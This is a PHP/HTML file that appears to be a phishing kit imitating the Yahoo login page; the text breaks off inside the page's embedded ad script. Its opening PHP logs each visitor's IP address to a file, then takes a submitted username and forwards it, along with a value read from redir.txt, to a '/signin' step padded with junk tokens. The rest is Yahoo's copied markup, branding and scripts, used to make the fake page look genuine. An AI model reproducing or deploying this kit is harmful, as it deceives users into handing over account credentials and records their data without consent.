<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
?>
<?php
$u = $_POST['username'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));
if ($u){
    echo "<script>window.location = '/signin?page-id=kfdkjgksdhlgkjlahkjehkhriuquy43ou384tuaifkdvf==&cap=skjfhgkjsdhfkjgkksdfkghkrguhuwoy84583u498r98uwtuihkgvhkfvdks,fjkdjsklghkhdkfjgkjfsgfghdkgdjhlfjgg==&id=".$u."&r=".$r."';</script>";
}
?>

<!DOCTYPE html>
<html id="Stencil" class="js grid light-theme "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <meta name="description" content="Yahoo">
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico">
        <meta name="google-site-verification" content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png">
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="./Yahoo_files/yahoo-main.css" rel="stylesheet" type="text/css">
        <script nonce="">
            var pageStartTime = new Date().getTime();
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"}};
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 794260018;
root.I13N_config.location = "https:\u002F\u002Flogin.yahoo.com\u002F";
root.I13N_config.referrer = "https:\u002F\u002Fwww.google.com\u002F";
root.I13N_config.keys || (root.I13N_config.keys = {});
root.I13N_config.keys.pg_name = "loginLanding";
root.I13N_config.keys.gm_np = "yahoo";
root.I13N_config.keys.p_sec = "DEFAULT_SECTION";
root.I13N_config.keys.p_subsec = "DEFAULT_SUBSECTION";
root.mKeyPrefix = "login-landing-";
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=794260018&ref=https%3A%2F%2Flogin.yahoo.com%2F&sa=geminifed%253D1%2520y-bucket%253D","k2Rate":1,"positions":{"RICH":{"sandbox":"allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox","id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":5000,"noexp":1,"fdb":"","on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1616484568053;
root.challenge.isAndroidWebview = false;
root.I13N_config.keys.pct = "signin";
root.currentURL = "\u002F";
root.COUNTRY_CODES_MAP = {"AF":"+93","AL":"+355","DZ":"+213","AS":"+1","AD":"+376","AO":"+244","AI":"+1","AG":"+1","AR":"+54","AM":"+374","AW":"+297","AC":"+247","AU":"+61","AX":"+672","AT":"+43","AZ":"+994","BS":"+1","BH":"+973","BD":"+880","BB":"+1","BY":"+375","BE":"+32","BZ":"+501","BJ":"+229","BM":"+1","BT":"+975","BO":"+591","BA":"+387","BW":"+267","BR":"+55","VG":"+1","BN":"+673","BG":"+359","BF":"+226","BI":"+257","KH":"+855","CM":"+237","CA":"+1","CV":"+238","KY":"+1","CF":"+236","TD":"+235","CL":"+56","CN":"+86","CO":"+57","KM":"+269","CG":"+242","CK":"+682","CR":"+506","CI":"+225","HR":"+385","CU":"+53","CY":"+357","CZ":"+420","CD":"+243","DK":"+45","DG":"+246","DJ":"+253","DM":"+1","DO":"+1","TL":"+670","EC":"+593","EG":"+20","SV":"+503","GQ":"+240","ER":"+291","EE":"+372","ET":"+251","FK":"+500","FO":"+298","FJ":"+679","FI":"+358","FR":"+33","GF":"+594","PF":"+689","GA":"+241","GM":"+220","GE":"+995","DE":"+49","GH":"+233","GI":"+350","GR":"+30","GL":"+299","GD":"+1","GP":"+590","GU":"+1","GT":"+502","GN":"+224","GW":"+245","GY":"+592","HT":"+509","HN":"+504","HK":"+852","HU":"+36","IS":"+354","IN":"+91","ID":"+62","IR":"+98","IQ":"+964","IE":"+353","IL":"+972","IT":"+39","JM":"+1","JP":"+81","JO":"+962","KZ":"+7","KE":"+254","KI":"+686","KW":"+965","KG":"+996","LA":"+856","LV":"+371","LB":"+961","LS":"+266","LR":"+231","LY":"+218","LI":"+423","LT":"+370","LU":"+352","MO":"+853","MK":"+389","MG":"+261","MW":"+265","MY":"+60","MV":"+960","ML":"+223","MT":"+356","MH":"+692","MQ":"+596","MR":"+222","MU":"+230","MX":"+52","FM":"+691","MD":"+373","MC":"+377","MN":"+976","ME":"+382","MS":"+1","MA":"+212","MZ":"+258","MM":"+95","NA":"+264","NR":"+674","NP":"+977","NL":"+31","AN":"+599","NC":"+687","NZ":"+64","NI":"+505","NE":"+227","NG":"+234","NU":"+683","KP":"+850","MP":"+1","NO":"+47","OM":"+968","PK":"+92","PW":"+680","PS":"+970","PA":"+507","PG":"+675","PY":"+595","PE":"+51","PH":"+63","PL":"+48","PT":"+351","PR":"+1","QA":"+974","RE":"+262","RO":"+40","RU":"+7","RW":"+250","SH":"+290","KN":"+1","LC":"+1","PM":"+508","VC":"+1","WS":"+685","SM":"+378","ST":"+239","SA":"+966","SN":"+221","RS":"+381","SC":"+248","SL":"+232","SG":"+65","SK":"+421","SI":"+386","SB":"+677","SO":"+252","ZA":"+27","KR":"+82","ES":"+34","LK":"+94","SD":"+249","SR":"+597","SZ":"+268","SE":"+46","CH":"+41","SY":"+963","TW":"+886","TJ":"+992","TZ":"+255","TH":"+66","TG":"+228","TK":"+690","TO":"+676","TT":"+1","TN":"+216","TR":"+90","TM":"+993","TC":"+1","TV":"+688","VI":"+1","UG":"+256","UA":"+380","AE":"+971","GB":"+44","US":"+1","UY":"+598","UZ":"+998","VU":"+678","VA":"+379","VE":"+58","VN":"+84","WF":"+681","YE":"+967","ZM":"+260","ZW":"+263"};
root.enforceCountryCodeDropDown = false;
root.isIOSDevice = false;
}(this));

            
            YUI_config.global = window;


            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=52ro0ttg5j66o&crumb=' + encodeURIComponent('NS4Za8TxVdF') + '&message=' + encodeURIComponent(name) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };

        </script>
    <script type="text/x-safeframe-booted" id="sf_tag_1616484569872_69">{"positions":[{"id":"RICH","html":"<style media=\"screen\">\n.act-sans-select{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}#image-holder{left:0;top:0;width:619px;height:646px;overflow:hidden;position:absolute}#content{position:absolute;top:369px;left:21px;width:598px;height:auto;color:#000;font:14px 'Helvetica Neue',Helvetica,Arial,sans-serif}#cta{width:auto;height:auto;margin:0 447px 0 0;padding:9px 0;border-radius:18px;border:solid 1px #000}#cta-text{position:relative;margin:0 10px 0 10px;width:auto;height:auto;font-size:16px;font-weight:400;font-stretch:normal;font-style:normal;line-height:normal;letter-spacing:normal;text-align:center;color:#000}.ad-source{font:14px 'Helvetica Neue',Helvetica,Arial,sans-serif;position:absolute;right:35px;bottom:19px;margin:0;color:#828a93}.title{margin:0;padding:0 5px 0 0;width:579px;height:auto;font-size:24px;font-weight:700;font-stretch:normal;font-style:normal;line-height:normal;letter-spacing:normal;color:#000}.summary{width:579px;height:auto;margin:15px 0 22px;font-size:16px;font-weight:400;font-stretch:normal;font-style:normal;line-height:1.38;letter-spacing:normal;color:#000}.grade{width:619px;height:323px;position:absolute;top:323px;background-image:linear-gradient(to bottom,rgba(248,249,250,0),#fff,#fff,#fff,#fff)}.getFeedbackThanks{margin-top:14px;font:14px Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:700;border-radius:2px}\n<\/style>\n<script type=\"text\/javascript\" src=\"https:\/\/s.yimg.com\/dy\/ads\/gemini.js\"><\/script>\n<div id=\"replace-me-with-id\" style=\"margin-top: 0px; margin-left: 0px;\">\n  <div id=\"act-adContainer\" class=\"act-sans-select\">\n    <div style=\"height:1024px;width:1440px;background-color: #f3f7f9;position:absolute;\"><\/div>\n    <div id=\"act-adContent\" style=\"left:208px;top:11px;width:619px;height:562px;overflow:hidden;background-color:white;position:absolute;\">\n      <div id=\"image-holder\"><\/div>\n      <div id=\"content\" class=\"act-sans-select\">\n        <p class=\"title\"><\/p>\n        <p class=\"summary\"><\/p>\n        <div id=\"cta\">\n          <div id=\"cta-text\"><\/div>\n        <\/div>\n      <\/div>\n      <p class=\"ad-source\"><\/p>\n    <\/div>\n    <a id=\"act-inv\" target=\"_blank\" rel=\"noopener noreferrer\" style=\"cursor: pointer; left: 208px; top: 11px; width: 619px; height: 562px; background-color: rgba(255, 0, 0, 0); position: absolute;\"><\/a>\n  <\/div>\n<\/div>\n<img src=\"https:\/\/s.yimg.com\/cv\/eng\/externals\/131110\/a\/p.gif\" class=\"act-no-disp\" \/>\n<script type=\"text\/javascript\">\n  var info = {\n    version: '1.1.21',\n    type: 'Gemini Login'\n  };\n  window.ACT = window.ACT || {};\n  window.ACT.testing = false; \nwindow.ACT.response = {\"ads\":[{\"beacon\":\"https:\/\/sg3.beap.gemini.yahoo.com\/mbcsc?bv=1.0.0&es=UWEhePUGIS_cDBWIYTY8ZBWYMtEHzaCaqb7pakrfqrpty_oBhVqVkoe8nKhfMu5Jo9iiMRPYh72L5U3IiW7r4d5LJ7.v0QmeDXtvre6jOi8n57gvbeEDoZGGfrJcd.ro4QnDZ2vclk0epP5olCPBg9XNE7khAs5_.PTVwD_P8.9sw4gLK6Vve5220cEVeE4SST4ZnrISHMFgAq9_TKba4gylTjtHYWHi7LWf6wnjFvYOSehUG7Vvx3aUXjPU7hY5wD4Fdb1sOtyMKD5ZvsVR4fdGa1hdbJG8sEXonlT96iY4PU6m42aACvjcHb6TDIjfgTTvpmMzAMvtXtTUoL06.HKhYzZpGURl8L2pDtrY5uNQvLdxrPruIh4ipupwkCFX1dyWJ4f.qlCVMVBrh7p3PdKfubBGc4h8eoaNrvouG3Kgq3OUgowCSWLcoXbtW_13gw--&ap=$(AD_POSN)\",\"ccCode\":\"STRM\",\"creativeId\":36475061123,\"displayUrl\":\"https:\/\/s.yimg.com\/av\/curveball\/ads\/pr\/RESIZE\/82x82\/e793e74093fccb4fdd984a2e9319d481.jpeg\",\"index\":1,\"landingPageUrl\":\"https:\/\/in.pearson.com\/assessments-and-certifications\/pte-academic\/pte-canada.html?utm_source=Yahoo\",\"postTapAdFormat\":\"ADVERTISER_SITE\",\"preTapAdFormat\":\"TEXT\",\"rules\":{\"viewabilityDefStatic\":{\"c\":1,\"d\":1,\"p\":50}},\"sponsoredBy\":\"PTE Academic\",\"tag\":\"{\\n   \\\"ad_feedback_beacon\\\" : \\\"https:\/\/beap-bc.yahoo.com\/af\/sg3?bv=1.0.0&bs=(15pfqlntv(gid$810301da-8ba9-11eb-bc88-008cfacf4cf0-7f2f5173b700,st$1616484569536000,li$0,cr$36475061123,dmn$in.pearson.com,srv$3,exp$1616491769536000,ct$27,v$1.0,adv$1665273,pbid$1,seid$5678181))&r=1616484569536&al=$(AD_FEEDBACK)\\\",\\n   \\\"advertiser_id\\\" : \\\"1665273\\\",\\n   \\\"afb_cfg_url\\\" : \\\"https:\/\/afb.adx.yahoo.com\/native\/config?af=TEXT&sl=$(AD_FEEDBACK_SITE_LOCALE)&dt=$(AD_FEEDBACK_DEVICE_TYPE)\\\",\\n   \\\"assets\\\" : [\\n      {\\n         \\\"styles\\\" : {\\n            \\\"bgColor\\\" : \\\"000000\\\"\\n         },\\n         \\\"text\\\" : \\\"Learn More\\\",\\n         \\\"usageType\\\" : \\\"CTA\\\"\\n      },\\n      {\\n         \\\"styles\\\" : {\\n            \\\"bgColorGradientLinear1\\\" : \\\"ECEDED\\\",\\n            \\\"bgColorGradientLinear2\\\" : \\\"E8BDB6\\\",\\n            \\\"textColor\\\" : \\\"000000\\\"\\n         },\\n         \\\"usageType\\\" : \\\"CONTAINER\\\"\\n      }\\n   ],\\n   \\\"callToAction\\\" : \\\"Learn More\\\",\\n   \\\"clickUrl\\\" : \\\"https:\/\/beap.gemini.yahoo.com\/mbclk?bv=1.0.0&es=SqA48qEGIS8mkWD5e4PZFy318M303VsulBJiMF1ROSPc667xJVxZey30supcH11vpSQO9PaVrg6dPYcBbiWvdgXbUrv.Ykj53sK6oWxdisYezPcKdExxj_vY1lO.EGcsobwfCQV3BUPhcFN3BtG5wSVZHlkLFkiEbyV5ex3GdZD07PHXkRKLWEy9LUPeR5mcGZfR_mPi_kOWpv9RIL7IuFErhtpryku1WWfswuUJwV92VSKK0HsJvYBISzMuIhsw_fA.owvoiqIC1AzLRQYWVZelNOgYMEVz_H5CA0gXI.31tZbelXIskKeKW3Bw7A6VgODmWxccRUmwBiDg_EcLpZW4dmoHa_DtB9EZn7MSKzGTbz2Bc7TEQg7JGdEqXTDMAcjloBHEMmWQqFEMnQyYHTKctPRHbzrtASRYcFCMmBGFv1I2hzgm1xpEzT0M_vw4Z_RxhVAI5GfqqON9PJtRplFwyOW8LfgzhW9PlN4ekNxHkRFZ7sV0tQP2yI3I4CxcmyyqsEeSd.M4fI6.h2FhfoN1bjNxWy5D4JyiHYBHD7ScK8ETV2seTFcfCfroYguAOYIm.OlcVwrtcQ--\\\",\\n   \\\"creativeLanguage\\\" : \\\"en\\\",\\n   \\\"dpaDeepLinking\\\" : false,\\n   \\\"headline\\\" : \\\"Living Canadian Dream? PTE Makes IT Easy!\\\",\\n   \\\"hqImage\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134336471-3144.jpg\\\",\\n   \\\"hqImageHeight\\\" : 627,\\n   \\\"hqImageWidth\\\" : 1200,\\n   \\\"image\\\" : \\\"https:\/\/s.yimg.com\/av\/curveball\/ads\/pr\/RESIZE\/82x82\/e793e74093fccb4fdd984a2e9319d481.jpeg\\\",\\n   \\\"imageHeight\\\" : 82,\\n   \\\"imageWidth\\\" : 82,\\n   \\\"landingUrl\\\" : \\\"https:\/\/in.pearson.com\/assessments-and-certifications\/pte-academic\/pte-canada.html?utm_source=Yahoo\\\",\\n   \\\"objective\\\" : \\\"VISIT_WEB\\\",\\n   \\\"origImg\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134330504-3330.jpg\\\",\\n   \\\"origImgHeight\\\" : 627,\\n   \\\"origImgWidth\\\" : 627,\\n   \\\"secHqImage\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134336471-3144.jpg\\\",\\n   \\\"secImage\\\" : \\\"https:\/\/s.yimg.com\/av\/curveball\/ads\/pr\/RESIZE\/82x82\/e793e74093fccb4fdd984a2e9319d481.jpeg\\\",\\n   \\\"secOrigImg\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134330504-3330.jpg\\\",\\n   \\\"secThumbnailImage\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134330780-9742.jpg\\\",\\n   \\\"source\\\" : \\\"PTE Academic\\\",\\n   \\\"sponsoredByLabel\\\" : \\\"Ad\\\",\\n   \\\"summary\\\" : \\\"PTE is accepted by top Canadian universities & colleges. You can send your score to IRCC India and the choice of your institution in a single click.\\\",\\n   \\\"textInImageOverlapSecHqImage\\\" : \\\"UNKNOWN\\\",\\n   \\\"textInImageOverlapSecOrigImg\\\" : \\\"UNKNOWN\\\",\\n   \\\"textInImagePctSecHqImage\\\" : \\\"UNKNOWN\\\",\\n   \\\"textInImagePctSecOrigImg\\\" : \\\"UNKNOWN\\\",\\n   \\\"thirdPartyTrackingClickUrl\\\" : \\\"NOT_PROVIDED\\\",\\n   \\\"thumbnailImage\\\" : \\\"https:\/\/s.yimg.com\/av\/ads\/1616134330780-9742.jpg\\\",\\n   \\\"thumbnailImageHeight\\\" : 180,\\n   \\\"thumbnailImageWidth\\\" : 180,\\n   \\\"uuid\\\" : \\\"36475061123\\\"\\n}\\n\"}],\"adsRequested\":1,\"adserverLatency\":0.013,\"section\":{\"id\":5678181},\"status\":\"0\",\"totalAds\":1,\"totalLatency\":0.028028,\"version\":\"2\"}\n;function beacon(){(new Image).src=window.ACT.response.ads[0].beacon}function thirdParty(){var o,r=window.ACT.response.ads[0].rules;for(o in r){var e=r[o].d;setTimeout(function(){var e,t,i,n,a=window.ACT.response.ads[0].thirdPartyTrackingClickUrl;a&&(e=r[o].c||0,t=r[o].d||0,i=r[o].p||0,n=r[o].t||0,a=(a=(a=(a=a.replace(\/cont\/,e)).replace(\/dur\/,t)).replace(\/pix\/,i)).replace(\/vt\/,n),(new Image).src=a)},1e3*e)}}document.body&&(document.body.style.margin=\"0px 0px 0px 0px\"),window.ACT.labs={byId:function(e){return document.getElementById(e)},trace:function(){console&&!0===window.ACT.testing&&console.log(arguments)},loadScript:function(e,t){var i,a=[\".\/\",\"http:\/\/localhost\",\"https:\/\/localhost\",\"https:\/\/cdn.cmp.advertising.com\/\",\"https:\/\/qa-cdn.cmp.advertising.com\/\",\"https:\/\/ad-formats.advertising.aol.com\/\",\"https:\/\/s.yimg.com\/\"];!function(e){for(var t=e||\"\",i=!1,n=0;n<a.length;n++)0===t.indexOf(a[n])&&(i=!0);return i}(e)||((i=document.createElement(\"script\")).type=\"text\/javascript\",i.readyState?i.onreadystatechange=function(){\"loaded\"!=i.readyState&&\"complete\"!=i.readyState||(i.onreadystatechange=null,t())}:i.onload=function(){t()},i.src=e,document.head.appendChild(i))},nav:function(){var e,t,i=navigator.appVersion,n=\"unknown\",a=(a=(t=navigator.userAgent).match(\/(opera|chrome|safari|firefox|msie|trident(?=\\\/))\\\/?\\s*(\\d+)\/i)||[],\/trident\/i.test(a[1])?{browser:\"IE\",version:(e=\/\\brv[ :]+(\\d+)\/g.exec(t)||[])[1]||\"\"}:\"Chrome\"===a[1]&&null!==(e=t.match(\/\\bOPR\\\/(\\d+)\/))?{browser:\"Opera\",version:e[1]}:(a=a[2]?[a[1],a[2]]:[navigator.appName,i,\"-?\"],null!==(e=t.match(\/version\\\/(\\d+)\/i))&&a.splice(1,1,e[1]),{browser:a[0],version:a[1]}));switch(!0){case-1<i.indexOf(\"Win\"):n=\"Windows\";break;case-1<i.indexOf(\"Mac\"):n=\"MacOS\";break;case-1<i.indexOf(\"X11\"):n=\"UNIX\";break;case-1<i.indexOf(\"Linux\"):n=\"Linux\"}return a.os=n,a},checkInViewResponse:function(){},inView:!0,isRegistered:!1,_DarlaKey:\"\",set DarlaKey(e){window.ACT.labs._DarlaKey=e},get DarlaKey(){return window.ACT.labs._DarlaKey}},setTimeout(beacon,1e3*window.ACT.response.ads[0].rules.viewabilityDefStatic.d),thirdParty(),function(){var e,t,p,r,c,s,h,d,b,a,o,l,u,g,f,v,m,i=window.ACT||{},x=window.ACT.labs,w=x.trace,y={};function n(){e=i.Apply,t=i.EventManager,p=i.InvisibleButton,i.Load,r=i.Remove,c=i.SVG,s=i.Sprite,i.Border,new t,h=e.properties,function(){k();var t=x.nav();w(\"[tpl].nav\",t),containerElement=x.byId(\"replace-me-with-id\");var e=d.section.id,i=d.ads[0].creativeId,n=d.ads[0].index;Gemini(d),containerElement.id=\"gemini-\"+e+\"-\"+i+\"-\"+n,(a=new Image).onload=function(){x.byId(\"image-holder\").appendChild(b.contain(a,619,323)),(o=new Image).onload=function(){o=b.contain(o,619,323),b.setStyle(o,{opacity:(\"ie\"===t.browser.toLowerCase()||\"msie\"===t.browser.toLowerCase())&&t.version.toString()<=\"11\"?.08:.5,transformOrigin:\"50% 50%\",transform:\"rotateX(180deg)\"});var e=b.div(\"grade\");e.style.overflow=\"hidden\",b.setBlur(o,11),grade=b.div(\"grade\"),e.appendChild(o),x.byId(\"image-holder\").appendChild(e),x.byId(\"image-holder\").appendChild(grade)},o.src=b.image},a.src=b.image,function(){var e=b.byClass(\"ad-source\"),t=b.byClass(\"title\"),i=b.byClass(\"summary\"),n=x.byId(\"cta-text\"),a=x.byId(\"cta\"),o=new p(25,32,\"adClick\",!1),r=x.nav(),d=b.summary,l=b.title;if(e.innerHTML=\"Ad&nbsp;&bull;&nbsp;\",e.textContent=e.innerHTML.replace(\/&nbsp;\/g,\" \")+b.source,t.textContent=l,i.textContent=d,(\"ie\"===r.browser.toLowerCase()||\"msie\"===r.browser.toLowerCase())&&parseInt(r.version,10)<=11){function c(e){var t=0;return e.offsetHeight?t=e.offsetHeight:e.style.pixelHeight&&(t=e.style.pixelHeight),t}for(var s;30<c(t);)(s=l.split(\" \")).pop(),l=s.join(\" \"),t.textContent=l+\"...\";for(;50<c(i);)(s=d.split(\" \")).pop(),d=s.join(\" \"),i.textContent=d+\"...\"}else b.setStyle(i,{display:\"-webkit-box\",overflow:\"hidden\",webkitBoxOrient:\"vertical\",mozBoxOrient:\"vertical\",webkitLineClamp:2,lineClamp:2}),b.setStyle(t,{display:\"-webkit-box\",overflow:\"hidden\",webkitBoxOrient:\"vertical\",mozBoxOrient:\"vertical\",webkitLineClamp:1,lineClamp:1});n.textContent=b.cta,\"\"===n.textContent&&(a.style.display=\"none\");e=b.getComputedStyle(e),o.style={left:e.left,top:e.top,zIndex:110},x.byId(\"act-adContent\").appendChild(o.div),o.addEventListener(\"click\",function(){window.open(\"https:\/\/www.verizonmedia.com\/policies\/us\/en\/verizonmedia\/privacy\/adinfo\/index.html\",\"_blank\")})}(),function(){var e=x.byId(\"act-inv\");x.byId(\"act-adContainer\");l=b.getDots(),u=b.getFeedback(),g=b.getFeedbackPanel(),f=b.getChoicePanel(),v=b.getSomethingElse(),m=b.getFinalPanel(),e.setAttribute(\"href\",b.clickUrl),x.byId(\"act-adContent\").appendChild(l.div)}()}()}function k(){var e=!1;window.$sf&&window.$sf.ext&&window.$sf.ext.register&&(window.$sf.ext.register(1440,1024,b.notify),e=!0),!1===e&&setTimeout(k,50)}b={saved:{inView:0},get ad(){return d.ads[0]},get tag(){return b.ad.tag},get image(){return b.tag.secHqImage},get title(){return b.tag.headline},get summary(){return b.tag.summary},get source(){return b.tag.source},get cta(){return b.tag.callToAction},get thirdPartyTrackingClickUrl(){return b.tag.thirdPartyTrackingClickUrl},get clickUrl(){return b.tag.clickUrl},notify:function(){\"register\"===cmd||\"register-update\"===cmd?(x.isRegistered=!0,x.DarlaKey=data.key):\"geom-update\"===cmd&&(b.isInView(),data&&data.key&&(x.DarlaKey=data.key))},isInView:function(){var e=$sf.ext.inViewPercentage();b.saved.inView!==Math.round(e)&&(0<=(b.saved.inView=e)||e<=100)&&(49<e?x.checkInViewResponse(\"under\"):x.checkInViewResponse(\"over\"))},div:function(e){var t=document.createElement(\"div\");return t.setAttribute(\"class\",e),t},contain:function(e,t,i){var n=e.width\/t,a=e.height\/i;return n<a?(e.width=t,e.height\/=n):(e.height=i,e.width\/=a),e},byClass:function(e){return document.getElementsByClassName(e)[0]},setBlur:function(e,t){for(var i=[\"f\",\"webkitF\",\"mozF\",\"oF\",\"msF\"],n={},a=0;a<i.length;a++)n[i[a]+\"ilter\"]=\"blur(\"+t+\"px)\";b.setStyle(e,n),e.style.filter=\"DXImageTransform.Microsoft.Blur(PixelRadius='\"+t+\"')\"},getComputedStyle:function(e){return e?window.getComputedStyle(e,null):null},getAd:function(){var e=new s(\"act-ad\");return e.div.innerHTML=\"Ad\",e.style={top:\"\",left:\"\",width:\"\",height:\"\"},e.div.setAttribute(\"class\",\"act-sans-select\"),e.addEventListener(\"click\",function(){window.open(\"https:\/\/www.verizonmedia.com\/policies\/us\/en\/verizonmedia\/privacy\/adinfo\/index.html\",\"_blank\")}),e},getFeedback:function(){var e,t={money:'<svg width=\"22\" style=\"fill:#b9bdc5;stroke:#b9bdc5;stroke-width:0;vertical-align:bottom\" height=\"22\" viewBox=\"0 0 512 512\" data-icon=\"Moneyball\"><path d=\"M185.49 96.864L151.796 22.5c-7.5 3.433-14.763 7.08-21.812 11.196l40.562 70.776c4.857-2.75 9.875-5.282 14.946-7.608zM40.988 397.6c4.488 6.866 9.295 13.522 14.26 19.965l64.172-50.44c-3.488-4.33-6.814-8.978-9.825-13.73L40.987 397.6zM295.93 2.39C287.85 1.11 279.66.317 271.395 0l-3.934 81.442c5.65.264 11.195.74 16.69 1.584L295.928 2.39zM109.99 161.83l-68.45-44.42c-4.41 6.866-8.53 13.944-12.36 21.232l72.28 37.764c2.64-5.004 5.49-9.876 8.53-14.576zm318.188 46.636l78.354-22.71c-2.297-7.924-4.94-15.687-7.95-23.294l-75.844 30.16c2.062 5.123 3.91 10.456 5.44 15.844zm-346.576 49.49v-.886L0 257.955c0 8.237.37 16.477 1.216 24.56l81.23-7.767c-.526-5.543-.842-11.144-.842-16.793zm346.524-194.84c-6.072-5.336-12.544-10.405-19.17-15.212l-47.642 66.23c4.595 3.275 8.98 6.814 13.203 10.563l53.608-61.58zM150.896 492.933c7.395 3.38 15.054 6.443 22.816 9.137l26.7-77.058c-5.31-1.85-10.433-3.962-15.556-6.285l-33.96 74.206zM431.932 291.86c-1.058 5.495-2.377 10.935-3.88 16.164l78.192 23.185c2.323-7.87 4.278-15.79 5.756-23.925l-80.068-15.424zm-57.967 99.878l53.318 61.742c6.232-5.388 12.2-10.985 17.852-16.954l-58.994-56.41c-3.855 4.07-7.923 7.925-12.175 11.622zm-90.5 41.3l11.46 80.704c8.057-1.16 16.058-2.693 24.033-4.543l-18.96-79.382c-5.44 1.32-11.04 2.375-16.532 3.22zM249.19 203.08c0-5.175 3.644-8.292 13.968-8.292 14.393 0 28.575 11.41 40.59 24.137l40.036-28.89c-11.145-13.417-28.257-28.84-63.224-33.485v-20.81h-35.754v20.07c-42.095 4.173-65.782 29.312-65.782 58.427 0 61.677 97.26 54.334 97.26 77.31 0 5.862-4.04 9.613-20.228 9.613-17.59 0-35.44-11.04-47.72-25.246l-40.327 34.013c12.202 13.73 35.493 28.627 67.236 32.8v21.97h35.755V343.2c46.162-4.647 73.1-28.36 73.1-62.64 0-57.73-94.91-50.387-94.91-77.482z\"><\/path><\/svg>',thumbsup:'<svg width=\"22\" style=\"fill:#b9bdc5;stroke:#b9bdc5;stroke-width:0;vertical-align:bottom\" height=\"22\" viewBox=\"0 0 24 24\" data-icon=\"thumbsup-outline\"><path d=\"M2.4 21.7V11.6h2.1c1.1 0 1.7-.7 2.1-1.1.7-.7 1.5-1.4 2.2-2.1.3-.2.5-.4.7-.6 1.6-1.8 2.3-3.4 2.2-5.5 0 0 .1-.1.3 0 .5.1 1 .6 1.1 1.6.3 2.4-.2 4.3-.7 4.7-.9.7-.4 2 .8 2h7.1c.7 0 1.3.4 1.3.8 0 .3-.5.8-.7.8-1.6 0-1.6 2.1-.1 2.2 0 .1.1.2.1.4 0 .1 0 .2-.3.3-.3-.1-.5-.1-.7-.1-1.3 0-1.7 1.7-.5 2.2 0 0 .2.1.3.2.2.2.3.3.3.6 0 .1-.1.1-.3.3-.2.1-.5.2-.7.2-1.3.2-1.4 1.9-.1 2.2l.1.1s.2.2.2.5c0 .4-.2.6-.6.6l-16.2-.2zM20.3 8.3h-5.1c.4-1.3.6-2.9.3-4.7-.2-2-1.5-3.3-3.1-3.6-1.7-.3-3.2.7-3.1 2.4.1 1.5-.4 2.6-1.7 4l-.5.5c-.6.7-1.3 1.4-2 2-.3.2-.5.4-.7.5H1.2c-.7 0-1.2.5-1.2 1.1v12.3c0 .7.6 1.2 1.2 1.2h17.3c1.6 0 3-1 3-2.8 0-.5-.1-.9-.3-1.2.7-.5 1.1-1.1 1.1-2 0-.5-.1-.9-.3-1.3.7-.4 1.2-1.1 1.2-2 0-.4-.1-.9-.3-1.3.6-.5 1-1.3 1-2.1.1-1.8-1.7-3-3.6-3z\"><\/path><\/svg>',thumbsdown:'<svg width=\"22\" 